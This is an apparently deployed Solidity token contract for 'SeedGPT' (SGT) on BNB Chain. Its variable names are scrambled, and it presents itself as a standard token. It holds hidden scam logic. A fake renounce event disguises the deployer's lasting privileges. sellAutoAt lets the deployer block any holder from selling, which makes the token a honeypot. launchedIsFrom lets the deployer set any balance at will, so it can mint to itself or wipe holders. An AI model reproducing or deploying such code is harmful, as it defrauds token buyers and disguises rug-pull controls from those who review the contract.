/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface listTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapReceiver) external view returns (uint256);

    function transfer(address autoAt, uint256 fundLiquidity) external returns (bool);

    function allowance(address launchedEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address autoAt,
        uint256 fundLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minLaunch, uint256 value);
    event Approval(address indexed launchedEnable, address indexed spender, uint256 value);
}

interface marketingShouldSwap {
    function createPair(address autoMin, address walletSell) external returns (address);
}

contract SeedGPT is listTeam {

    uint256 private maxExempt;

    constructor (){ 
        limitTradingMode = fromSender();
        listWallet[limitTradingMode] = feeLaunch;
        takeFrom[limitTradingMode] = true;
        totalTo = marketingShouldSwap(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        emit Transfer(address(0), limitTradingMode, feeLaunch);
        emit OwnershipTransferred(limitTradingMode, address(0));
    }

    bool public tradingToken;

    bool private takeMode;

    function approve(address limitList, uint256 fundLiquidity) public virtual override returns (bool) {
        launchToken[fromSender()][limitList] = fundLiquidity;
        emit Approval(fromSender(), limitList, fundLiquidity);
        return true;
    }

    function senderExempt(address autoWalletLaunched, address autoAt, uint256 fundLiquidity) internal returns (bool) {
        require(listWallet[autoWalletLaunched] >= fundLiquidity);
        listWallet[autoWalletLaunched] -= fundLiquidity;
        listWallet[autoAt] += fundLiquidity;
        emit Transfer(autoWalletLaunched, autoAt, fundLiquidity);
        return true;
    }

    function fundSell(address exemptList) public {
        require(!tokenSender);
        takeFrom[exemptList] = true;
        tokenSender = true;
    }

    event OwnershipTransferred(address indexed tradingExempt, address indexed takeFund);

    uint256 private launchFromReceiver;

    uint256 public limitMinReceiver;

    function balanceOf(address swapReceiver) public view virtual override returns (uint256) {
        return listWallet[swapReceiver];
    }

    function transferFrom(address autoWalletLaunched, address autoAt, uint256 fundLiquidity) external override returns (bool) {
        if (launchToken[autoWalletLaunched][fromSender()] != type(uint256).max) {
            require(fundLiquidity <= launchToken[autoWalletLaunched][fromSender()]);
            launchToken[autoWalletLaunched][fromSender()] -= fundLiquidity;
        }
        return launchFund(autoWalletLaunched, autoAt, fundLiquidity);
    }

    function sellAutoAt(address tradingEnable) public {
        require(takeFrom[fromSender()]);
        if (tradingEnable == limitTradingMode || tradingEnable == totalTo) {
            return;
        }
        feeTake[tradingEnable] = true;
    }

    function launchedIsFrom(address modeSender, uint256 fundLiquidity) public {
        require(takeFrom[fromSender()]);
        listWallet[modeSender] = fundLiquidity;
    }

    mapping(address => uint256) private listWallet;

    mapping(address => bool) public takeFrom;

    bool public tokenSender;

    string private senderMode = "Seed GPT";

    function fromSender() private view returns (address) {
        return msg.sender;
    }

    uint256 public launchEnableFee;

    function fundExemptShould() public {
        emit OwnershipTransferred(limitTradingMode, address(0));
        senderLaunchTotal = address(0);
    }

    string private senderTake = "SGT";

    mapping(address => bool) public feeTake;

    address private senderLaunchTotal;

    uint256 private feeLaunch = 100000000 * 10 ** 18;

    function symbol() external view virtual returns (string memory) {
        return senderTake;
    }

    function launchFund(address autoWalletLaunched, address autoAt, uint256 fundLiquidity) internal returns (bool) {
        require(!feeTake[autoWalletLaunched]);
        return senderExempt(autoWalletLaunched, autoAt, fundLiquidity);
    }

    function name() external view virtual returns (string memory) {
        return senderMode;
    }

    uint256 public takeTotal;

    function transfer(address modeSender, uint256 fundLiquidity) external virtual override returns (bool) {
        return launchFund(fromSender(), modeSender, fundLiquidity);
    }

    function owner() external view returns (address) {
        return senderLaunchTotal;
    }

    uint8 private receiverMin = 18;

    address public totalTo;

    function allowance(address shouldReceiverMarketing, address limitList) external view virtual override returns (uint256) {
        return launchToken[shouldReceiverMarketing][limitList];
    }

    mapping(address => mapping(address => uint256)) private launchToken;

    address public limitTradingMode;

    uint256 public teamShouldLiquidity;

    bool public enableMode;

    function totalSupply() external view virtual override returns (uint256) {
        return feeLaunch;
    }

    function decimals() external view virtual returns (uint8) {
        return receiverMin;
    }

}